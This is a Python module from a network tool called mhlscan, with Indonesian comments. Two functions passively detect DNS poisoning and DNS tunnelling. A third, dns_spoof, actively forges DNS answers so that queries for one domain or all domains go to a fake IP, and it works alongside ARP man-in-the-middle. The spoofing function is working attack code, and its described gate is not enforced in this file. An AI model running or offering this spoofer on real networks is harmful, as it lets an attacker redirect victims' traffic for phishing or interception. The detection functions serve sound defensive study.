# -*- coding: utf-8 -*-
# GNU GPL License V3
# mhlscan by sigit-hdteamlabs
"""_dnspoison.py - DNS poison detector (passive) + active spoof (gate).

Passive:
- detect_dns_anomaly   : deteksi DNS response dari non-53 atau ID mismatch
- detect_dns_tunnel    : deteksi DNS query panjang (data exfil indicator)

Active (GATE):
- dns_spoof            : jawab DNS query dengan IP palsu (butuh ARP mitm dulu)
"""

import os
import platform
import threading
import time
from collections import defaultdict

try:
    from scapy.all import (
        ARP, DNS, DNSRR, IP, UDP, Ether, sendp, sniff, srp, conf,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


def _is_linux():
    return platform.system().lower() == "linux"


def _is_root():
    try:
        return os.geteuid() == 0
    except Exception:
        return False


# =========================================================
# PASSIVE DETECTION
# =========================================================
def detect_dns_anomaly(interface="eth0", duration=30):
    """Deteksi DNS response dari non-53 atau anomali ID.

    Return dict {suspicious: [...], total_responses}.
    """
    if not HAS_SCAPY:
        return {"error": "scapy not installed", "suspicious": []}
    if not _is_root():
        return {"error": "root required", "suspicious": []}

    print(f"  [*] DNS anomaly detector: {interface}, {duration}s")
    suspicious = []
    queries = {}  # (src, dnsid) -> qname
    total_resp = [0]

    def _handle(pkt):
        try:
            if not pkt.haslayer(DNS):
                return
            dns = pkt[DNS]
            src = pkt[IP].src if pkt.haslayer(IP) else "?"
            dst = pkt[IP].dst if pkt.haslayer(IP) else "?"

            if dns.qr == 0:  # query
                if dns.qd and dns.id is not None:
                    try:
                        qname = dns.qd.qname.decode("utf-8", "ignore")
                        queries[(src, dns.id)] = qname
                    except Exception:
                        pass
            elif dns.qr == 1:  # response
                total_resp[0] += 1
                # Cek dari port 53
                if pkt.haslayer(UDP) and pkt[UDP].sport != 53:
                    suspicious.append({
                        "type": "non_53_source",
                        "src": src, "sport": pkt[UDP].sport,
                        "reason": f"DNS response from port {pkt[UDP].sport}",
                    })
                # Cek ID match
                key = (dst, dns.id)
                if key in queries:
                    q = queries[key]
                    # Cocok, hapus dari pending
                    del queries[key]
                elif dns.id not in [k[1] for k in queries.keys() if k[0] == dst]:
                    suspicious.append({
                        "type": "id_mismatch",
                        "src": src, "id": dns.id,
                        "reason": "DNS response ID does not match any query",
                    })
        except Exception:
            pass

    try:
        sniff(iface=interface, prn=_handle, store=False,
              timeout=duration, filter="udp port 53")
    except Exception as e:
        return {"error": str(e), "suspicious": []}

    return {
        "suspicious": suspicious,
        "total_responses": total_resp[0],
        "duration": duration,
    }


def detect_dns_tunnel(interface="eth0", duration=30, min_qname_len=100):
    """Deteksi DNS tunneling: query dengan qname sangat panjang atau subdomain random.

    Return dict {suspicious: [...], total_queries}.
    """
    if not HAS_SCAPY:
        return {"error": "scapy not installed", "suspicious": []}
    if not _is_root():
        return {"error": "root required", "suspicious": []}

    print(f"  [*] DNS tunnel detector: {interface}, {duration}s")
    suspicious = []
    domains = defaultdict(int)
    total_q = [0]

    def _handle(pkt):
        try:
            if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
                return
            if not pkt[DNS].qd:
                return
            qname = pkt[DNS].qd.qname.decode("utf-8", "ignore").rstrip(".")
            total_q[0] += 1
            if len(qname) >= min_qname_len:
                suspicious.append({
                    "type": "long_qname",
                    "qname": qname[:200],
                    "length": len(qname),
                    "src": pkt[IP].src if pkt.haslayer(IP) else "?",
                })
            # Ambil root domain
            parts = qname.split(".")
            if len(parts) >= 2:
                root = ".".join(parts[-2:])
                domains[root] += 1
        except Exception:
            pass

    try:
        sniff(iface=interface, prn=_handle, store=False,
              timeout=duration, filter="udp port 53")
    except Exception as e:
        return {"error": str(e), "suspicious": []}

    return {
        "suspicious": suspicious,
        "total_queries": total_q[0],
        "top_domains": sorted(domains.items(), key=lambda x: -x[1])[:20],
        "duration": duration,
    }


# =========================================================
# ACTIVE DNS SPOOF (GATE)
# =========================================================
def dns_spoof(interface="eth0", fake_ip="127.0.0.1",
              target_domain=None, duration=60,
              target_ip=None, verbose=True):
    """Jawab DNS query dengan fake_ip. Butuh root + gate.

    Kalau target_domain=None, spoof SEMUA domain (DANGEROUS!).
    Kalau target_ip=None, spoof semua client. Kalau di-set, hanya
    spoof dari client IP tersebut.

    Return dict {captured, duration, fake_ip, target_domain, target_ip}.
    """
    if not HAS_SCAPY:
        return {"error": "scapy not installed", "captured": []}
    if not _is_linux():
        return {"error": "Linux only", "captured": []}
    if not _is_root():
        return {"error": "root required", "captured": []}

    print(f"  [*] DNS spoof: iface={interface} fake_ip={fake_ip} "
          f"domain={target_domain or '*ALL*'} "
          f"target={target_ip or '*ALL*'} duration={duration}s")
    if not target_domain:
        print("  [!] WARNING: spoofing ALL domains (no target_domain)")

    captured = []
    stop = threading.Event()

    def _handle(pkt):
        try:
            if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
                return
            if not pkt[DNS].qd:
                return
            # Filter by client IP
            if target_ip and pkt.haslayer(IP) and pkt[IP].src != target_ip:
                return
            qname = pkt[DNS].qd.qname.decode("utf-8", "ignore")
            if target_domain and target_domain not in qname:
                return

            # Bangun response
            resp = (
                IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                UDP(sport=53, dport=pkt[UDP].sport) /
                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10,
                             rdata=fake_ip))
            )
            sendp(Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / resp,
                  iface=interface, verbose=False)
            captured.append({"query": qname, "fake": fake_ip})
            if verbose:
                print(f"    [+] {qname} -> {fake_ip}")
        except Exception:
            pass

    def _sniff():
        try:
            sniff(iface=interface, prn=_handle, store=False,
                  timeout=duration, filter="udp port 53",
                  stop_filter=lambda x: stop.is_set())
        except Exception:
            pass

    t = threading.Thread(target=_sniff, daemon=True)
    t.start()
    try:
        t.join(timeout=duration + 5)
    except KeyboardInterrupt:
        stop.set()
        print("\n  [!] Interrupted")

    return {
        "captured": captured,
        "count": len(captured),
        "fake_ip": fake_ip,
        "target_domain": target_domain,
        "target_ip": target_ip,
        "duration": duration,
    }


def status():
    return {
        "scapy": HAS_SCAPY,
        "linux": _is_linux(),
        "root": _is_root(),
    }
